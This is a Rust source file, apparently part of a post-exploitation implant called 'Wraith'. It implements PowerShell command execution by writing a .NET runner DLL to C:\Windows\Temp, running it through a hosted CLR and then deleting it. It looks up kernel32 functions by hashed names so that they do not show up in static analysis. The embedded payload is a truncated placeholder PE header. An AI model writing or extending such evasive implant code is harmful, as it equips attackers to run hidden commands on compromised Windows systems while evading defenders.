use alloc::vec::Vec;
use alloc::format;

#[cfg(target_os = "windows")]
use crate::modules::clr::ClrHost;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct PowerShell;

// Minimal dummy PE header to simulate a .NET assembly structure (starts with MZ)
// In a real scenario, this would be the byte array of the compiled C# runner.
#[cfg(target_os = "windows")]
const RUNNER_DLL: &[u8] = &[
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, // MZ header
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // ... truncated. Represents minimal PE header.
];

impl PowerShell {
    pub fn exec(&self, cmd: &str) -> Vec<u8> {
        #[cfg(target_os = "windows")]
        {
            let path = "C:\\Windows\\Temp\\wraith_ps.dll";
            
            match unsafe { self.drop_runner(path) } {
                Ok(_) => {
                    let res = ClrHost::execute_assembly(
                        path,
                        "Wraith.Runner",
                        "Run",
                        cmd
                    );
                    let _ = unsafe { self.delete_runner(path) };
                    
                    match res {
                        Ok(exit_code) => format!("Executed via CLR. Exit code: {}", exit_code).into_bytes(),
                        Err(_) => b"CLR Execution Failed".to_vec()
                    }
                },
                Err(_) => b"Failed to drop runner".to_vec()
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            crate::modules::shell::Shell.exec(&format!("pwsh -c \"{}\"", cmd))
        }
    }

    #[cfg(target_os = "windows")]
    unsafe fn drop_runner(&self, path: &str) -> Result<(), ()> {
        let kernel32_hash = hash_str(b"kernel32.dll");
        let create_file_hash = hash_str(b"CreateFileA");
        let write_file_hash = hash_str(b"WriteFile");
        let close_handle_hash = hash_str(b"CloseHandle");

        let create_file = resolve_function(kernel32_hash, create_file_hash);
        let write_file = resolve_function(kernel32_hash, write_file_hash);
        let close_handle = resolve_function(kernel32_hash, close_handle_hash);

        if create_file.is_null() || write_file.is_null() || close_handle.is_null() {
            return Err(());
        }

        // CreateFileA signature
        type FnCreateFileA = unsafe extern "system" fn(
            *const u8, u32, u32, *mut c_void, u32, u32, *mut c_void
        ) -> *mut c_void;
        // WriteFile signature
        type FnWriteFile = unsafe extern "system" fn(
            *mut c_void, *const u8, u32, *mut u32, *mut c_void
        ) -> i32;
        // CloseHandle signature
        type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

        let create_file_fn: FnCreateFileA = core::mem::transmute(create_file);
        let write_file_fn: FnWriteFile = core::mem::transmute(write_file);
        let close_handle_fn: FnCloseHandle = core::mem::transmute(close_handle);

        // Null-terminate path
        let mut path_bytes = Vec::from(path.as_bytes());
        path_bytes.push(0);

        let handle = create_file_fn(
            path_bytes.as_ptr(),
            0x40000000, // GENERIC_WRITE
            0,          // No share
            core::ptr::null_mut(),
            2,          // CREATE_ALWAYS
            0x80,       // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut()
        );

        if handle == (-1isize as *mut c_void) { // INVALID_HANDLE_VALUE
            return Err(());
        }

        let mut written = 0;
        let success = write_file_fn(
            handle,
            RUNNER_DLL.as_ptr(),
            RUNNER_DLL.len() as u32,
            &mut written,
            core::ptr::null_mut()
        );

        close_handle_fn(handle);

        if success == 0 {
            return Err(());
        }

        Ok(())
    }

    #[cfg(target_os = "windows")]
    unsafe fn delete_runner(&self, path: &str) -> Result<(), ()> {
        let kernel32_hash = hash_str(b"kernel32.dll");
        let delete_file_hash = hash_str(b"DeleteFileA");
        let delete_file = resolve_function(kernel32_hash, delete_file_hash);

        if delete_file.is_null() {
            return Err(());
        }

        type FnDeleteFileA = unsafe extern "system" fn(*const u8) -> i32;
        let delete_file_fn: FnDeleteFileA = core::mem::transmute(delete_file);

        let mut path_bytes = Vec::from(path.as_bytes());
        path_bytes.push(0);

        if delete_file_fn(path_bytes.as_ptr()) == 0 {
            Err(())
        } else {
            Ok(())
        }
    }
}